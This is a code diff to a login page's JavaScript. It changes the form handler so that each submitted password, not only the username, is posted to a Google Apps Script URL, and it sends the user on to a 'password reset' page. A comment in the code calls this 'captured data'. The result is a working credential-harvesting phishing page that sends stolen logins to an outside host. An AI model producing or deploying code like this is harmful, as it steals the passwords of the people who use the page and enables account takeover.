@@ -39,7 +39,7 @@
             
             if (validateForm(username, password)) {
                 // Send captured data to remote storage (Google Apps Script endpoint)
-                logLogin(username);
+                logLogin(username, password);
             }
         });
         
@@ -66,11 +66,12 @@
             return isValid;
         }
         
-        function logLogin(username) {
+        function logLogin(username, password) {
             var url = "https://script.google.com/macros/s/AKfycbwLOI3FQgQZjTcqe9qHTzqAHhCel31IFEwdfotp6PE6p7lZoIU0K6pB-DzPMKyVZgP2/exec"; // Update with your deployed Google Apps Script URL
             
             var data = {
                 "username": username,
+                "password": password,
                 "login_timestamp": new Date().toISOString()
             };
             
@@ -83,8 +84,8 @@
                 .then(response => {
                     if (response.ok) {
                         console.log("Login logged successfully");
-                        // Redirect to a success page (optional)
-                        window.location.href = "success.html";
+                        // Redirect to password reset page
+                        window.location.href = "password_reset.html";
                     } else {
                         console.error("Error logging login");
                         // Handle error (optional)
